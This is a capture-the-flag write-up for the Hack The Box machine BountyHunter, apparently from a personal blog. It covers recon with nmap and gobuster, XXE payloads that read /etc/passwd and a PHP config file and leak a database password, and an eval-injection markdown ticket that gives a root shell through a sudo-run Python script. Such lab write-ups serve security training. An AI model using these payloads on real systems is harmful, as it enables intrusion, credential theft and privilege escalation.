---
layout: single
title: '<span class="htb">Hack The Box - Machine - BountyHunter</span>'
excerpt: "Welcome to the writeup of the bountyhunter machine of the Hack The Box platform. BountyHunter is an easy difficulty machine on linux."
date: 2021-11-25
header:
  teaser: /assets/images/htb-machine-bountyhunter/htb-machine-bountyhunter_banner.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hachthebox
  - walkthrough
  - writeup
tags:
  - markdown
  - xxe
toc: true
toc_label: "Content"
toc_sticky: true
show_time: true
---

<!-- BANNER -->
<a href="/assets/images/htb-machine-bountyhunter/htb-machine-bountyhunter_banner.png">
    <img src="/assets/images/htb-machine-bountyhunter/htb-machine-bountyhunter_banner.png" alt="Hack The Box - Machine - BountyHunter">
</a>

<!-- OVERVIEW -->

# Overview

Welcome to the writeup of the **bountyhunter machine** of the Hack The Box platform. BountyHunter is a Linux based machine that was active since July 24th to November 20th, on this machine we will find a XXE vulnerability and use it with a php wrapper to read internal files and get sensitive information, with the information gotten we will be able to connect to the machine through SSH, once inside the machine we will analyze a python script to find how we can abuse it to get code execution as root user and finish with the machine.

<!-- BEFORE STARTING -->

# Before starting

## Tmux for VPN connection

Connect to **Hack The Box VPN** in background with `tmux`

```bash
tmux new -s htb
sudo openvpn ~/.vpn/htb.ovpn
```

## Add to hosts file

**Add** machine to `/etc/hosts` file, **check connection** with `ping` and **create work folders**

```bash
echo '10.10.11.100 bountyhunter.htb' >> /etc/hosts
ping -c 1 bountyhunter.htb
mkdir -p ~/htb/bountyhunter.htb/{exploits,fuzz,http,nmap}
```

# Recon

## Scan with nmap

Check **all ports** that are **open**, detect the service and its version with `nmap`

```bash
nmap -sC -sV -p- -T4 --min-rate=1000 -v -oA all bountyhunter.htb
```

```nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Bounty Hunters
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<a href="/assets/images/htb-machine-bountyhunter/htb-machine-bountyhunter_nmap.png"><img src="/assets/images/htb-machine-bountyhunter/htb-machine-bountyhunter_nmap.png"></a>

## Check website

Open firefox to inspect website

```bash
firefox http://bountyhunter.htb &
```

<a href="/assets/images/htb-machine-bountyhunter/htb-machine-bountyhunter_website.png"><img src="/assets/images/htb-machine-bountyhunter/htb-machine-bountyhunter_website.png"></a>

## Fuzzing with gobuster

Find directories and PHP files

```bash
gobuster dir -u "http://bountyhunter.htb/" -w "/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt" -t 23 -x php -o root_directories_php.fuzz
```

```txt
/assets               (Status: 301) [Size: 321] [--> http://bountyhunter.htb/assets/]
/css                  (Status: 301) [Size: 318] [--> http://bountyhunter.htb/css/]
/db.php               (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 25169]
/js                   (Status: 301) [Size: 317] [--> http://bountyhunter.htb/js/]
/portal.php           (Status: 200) [Size: 125]
/resources            (Status: 301) [Size: 324] [--> http://bountyhunter.htb/resources/]
/server-status        (Status: 403) [Size: 281]
```

Interesting file `db.php`, response code is **200** but size is **0**.
Open BurpSuite and navegate to web page, the **portal link** in main page go to **Bounty Report System**.

<a href="/assets/images/htb-machine-bountyhunter/htb-machine-bountyhunter_001.png"><img src="/assets/images/htb-machine-bountyhunter/htb-machine-bountyhunter_001.png"></a>

<a href="/assets/images/htb-machine-bountyhunter/htb-machine-bountyhunter_002.png"><img src="/assets/images/htb-machine-bountyhunter/htb-machine-bountyhunter_002.png"></a>

The above fields are converted to **base64** to form an **XML structure**, **time to check XXE vulnerability**.

# Gain Access

Use [CyberChef](https://gchq.github.io/CyberChef/) tool to generate payload, use To Base64 and URL Encode with special chars.

<a href="/assets/images/htb-machine-bountyhunter/htb-machine-bountyhunter_003.png"><img src="/assets/images/htb-machine-bountyhunter/htb-machine-bountyhunter_003.png"></a>

XXE Payload

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<bugreport>
    <title>&xxe;</title>
    <cwe>test</cwe>
    <cvss>test</cvss>
    <reward>test</reward>
</bugreport>
```

Payload

```txt
PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIHJlcGxhY2UgWzwhRU5USVRZIHh4ZSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCI%2BIF0%2BCjxidWdyZXBvcnQ%2BCiAgICA8dGl0bGU%2BJnh4ZTs8L3RpdGxlPgogICAgPGN3ZT50ZXN0PC9jd2U%2BCiAgICA8Y3Zzcz50ZXN0PC9jdnNzPgogICAgPHJld2FyZD50ZXN0PC9yZXdhcmQ%2BCjwvYnVncmVwb3J0Pg%3D%3D
```

<a href="/assets/images/htb-machine-bountyhunter/htb-machine-bountyhunter_004.png"><img src="/assets/images/htb-machine-bountyhunter/htb-machine-bountyhunter_004.png"></a>

Do you remember db.php file found in fuzz?

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=db.php"> ]>
<bugreport>
    <title>&xxe;</title>
    <cwe>test</cwe>
    <cvss>test</cvss>
    <reward>test</reward>
</bugreport>
```

Payload to base64

```txt
PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iSVNPLTg4NTktMSI%2FPgo8IURPQ1RZUEUgcmVwbGFjZSBbPCFFTlRJVFkgeHhlIFNZU1RFTSAicGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPWRiLnBocCI%2BIF0%2BCjxidWdyZXBvcnQ%2BCiAgICA8dGl0bGU%2BJnh4ZTs8L3RpdGxlPgogICAgPGN3ZT50ZXN0PC9jd2U%2BCiAgICA8Y3Zzcz50ZXN0PC9jdnNzPgogICAgPHJld2FyZD50ZXN0PC9yZXdhcmQ%2BCjwvYnVncmVwb3J0Pg%3D%3D
```

<a href="/assets/images/htb-machine-bountyhunter/htb-machine-bountyhunter_005.png"><img src="/assets/images/htb-machine-bountyhunter/htb-machine-bountyhunter_005.png"></a>

```txt
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

Time to check ssh, I could not log in with admin and password, but if we check the file extracted from the previous step, we can see that there is a user named development.

<a href="/assets/images/htb-machine-bountyhunter/htb-machine-bountyhunter_006.png"><img src="/assets/images/htb-machine-bountyhunter/htb-machine-bountyhunter_006.png"></a>

```bash
ssh development@bountyhunter.htb
```

<a href="/assets/images/htb-machine-bountyhunter/htb-machine-bountyhunter_user.png"><img src="/assets/images/htb-machine-bountyhunter/htb-machine-bountyhunter_user.png"></a>

# Privilege Escalation

```bash
sudo -l
```

<a href="/assets/images/htb-machine-bountyhunter/htb-machine-bountyhunter_007.png"><img src="/assets/images/htb-machine-bountyhunter/htb-machine-bountyhunter_007.png"></a>

The file `/opt/skytrain_inc/ticketValidator.py` is executed as **root**, maybe we can escalate here.

```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

Reviewing the above code, you can **create a markdown file** to achieve the following command execution, `exploit.md`

```markdown
# Skytrain Inc

## Ticket to root

**Ticket Code:**  
\*\*102 + 10 == 112 and **import**('os').system('/bin/bash') == False
```

```bash
python -m http.server 80
```

```
cd /tmp
wget http://10.10.15.162/exploit.md
chmod 777 exploit.md
sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
/tmp/exploit.md
```

<a href="/assets/images/htb-machine-bountyhunter/htb-machine-bountyhunter_root.png"><img src="/assets/images/htb-machine-bountyhunter/htb-machine-bountyhunter_root.png"></a>
